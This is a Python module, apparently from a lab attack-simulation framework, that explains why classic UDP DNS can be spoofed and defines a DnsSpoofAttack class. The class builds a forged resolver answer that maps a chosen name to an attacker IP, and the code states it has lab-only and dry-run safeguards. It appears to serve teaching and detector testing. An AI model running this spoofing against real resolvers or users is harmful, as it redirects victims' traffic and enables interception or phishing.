"""DNS spoofing / cache-poisoning response (lab-only).

Protocol weakness
-----------------
Classic DNS over UDP (RFC 1035) authenticates a response only by matching four
things against the outstanding query: the source IP, the destination port, the
question, and a 16-bit transaction ID. An on-path attacker can see all four and
simply answer first; an off-path attacker can try to guess the 16-bit ID (and,
historically, the source port before port randomisation). A forged answer that
arrives before the real resolver's reply is accepted and cached, so every later
lookup of that name is poisoned.

What this module does
---------------------
Builds a single forged A-record response mapping a victim-chosen name to an
attacker IP, as if it came from the resolver. It requires that the forged
answer IP is a private/lab address, requires the lab flag, defaults to dry-run,
and is of course bounded to the packets it builds. Delivering this for real
requires winning the race against the legitimate resolver, which is exactly the
timing property the detector keys on.
"""

from __future__ import annotations

from ..core.packets import dns_response
from .base import Attack


class DnsSpoofAttack(Attack):
    name = "dns-spoof"

    def __init__(
        self,
        *,
        victim_ip: str,
        resolver_ip: str,
        qname: str,
        spoof_ip: str,
        txid: int = 0x1337,
        victim_port: int = 50000,
        **kwargs,
    ) -> None:
        # The forged answer points the victim at spoof_ip; that is the address
        # we insist stays inside the lab.
        self.target_ip = spoof_ip
        super().__init__(**kwargs)
        self.victim_ip = victim_ip
        self.resolver_ip = resolver_ip
        self.qname = qname
        self.spoof_ip = spoof_ip
        self.txid = int(txid)
        self.victim_port = int(victim_port)

    def build_packets(self) -> list:
        forged = dns_response(
            src_ip=self.resolver_ip,  # pretend to be the real resolver
            dst_ip=self.victim_ip,
            sport=53,
            dport=self.victim_port,
            txid=self.txid,
            qname=self.qname,
            answer_ip=self.spoof_ip,
        )
        return [forged]
